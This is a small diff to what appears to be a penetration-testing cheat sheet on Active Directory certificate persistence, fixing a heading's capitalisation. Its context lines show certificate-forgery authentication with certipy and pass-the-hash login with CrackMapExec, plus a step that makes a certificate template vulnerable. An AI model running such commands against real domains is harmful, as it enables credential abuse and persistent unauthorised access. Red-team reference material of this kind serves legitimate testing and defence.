@@ -522,7 +522,7 @@ certipy auth -pfx 'forged-ea.pfx'
 cme smb <FQDN> -u <USER> -H <NTLM HASH>
 ```
 
-### Dpersist3 Configure vulnerable template
+### DPersist3 Configure vulnerable template
 - Requires `Enterprise Admin` permissions
 
 #### Add WriteOwner permissions to target template
